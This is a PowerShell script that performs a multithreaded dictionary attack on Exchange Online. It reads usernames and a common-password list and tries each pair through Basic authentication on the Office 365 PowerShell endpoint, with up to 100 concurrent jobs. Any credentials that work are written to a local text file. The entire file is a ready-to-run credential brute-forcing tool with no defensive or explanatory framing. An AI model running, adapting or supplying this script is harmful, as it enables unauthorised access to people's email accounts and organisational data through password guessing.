<#
.SYNOPSIS
bruteforceExchange.ps1 - dictionary attack on exchange

.DESCRIPTION 
This PowerShell script will execute a dictionary attack on exchange online.

.OUTPUTS
Results are output to a textfile.
#>

#...................................
# Variables
#...................................

$myDir = [Environment]::CurrentDirectory
$users = get-content "$mydir\wordlist\users.txt"
$passwords = Get-Content "$mydir\wordlist\10-million-password-list-top-50.txt"

#...................................
# Script
#...................................

$block = {
    Param([string] $password, [String] $user)
    $securepassword = $password | ConvertTo-SecureString -asPlainText -Force
    $O365Cred = New-Object System.Management.Automation.PSCredential($user,$securepassword)
    New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://outlook.office365.com/powershell-liveid/ -Credential $O365Cred -Authentication Basic -AllowRedirection
    $pssession = Get-PSSession
        if ($pssession) {
            echo "the password $password matches the user $user" > "$mydir\credentialsExchange.txt"
        }
}

#Remove all jobs
Get-Job | Remove-Job

#start brute-force
$MaxThreads = 100
foreach($user in $users){
    foreach($password in $passwords){
        While ($(Get-Job -state running).count -ge $MaxThreads){
            Start-Sleep  -Milliseconds 3
        }
        Start-Job -Scriptblock $Block -ArgumentList $password, $user
    }
}

#Wait for all jobs to finish.
While ($(Get-Job -State Running).count -gt 0){
    start-sleep 1
}

#Remove all jobs created.
Get-Job | Remove-Job

Get-PSSession | Remove-PSSession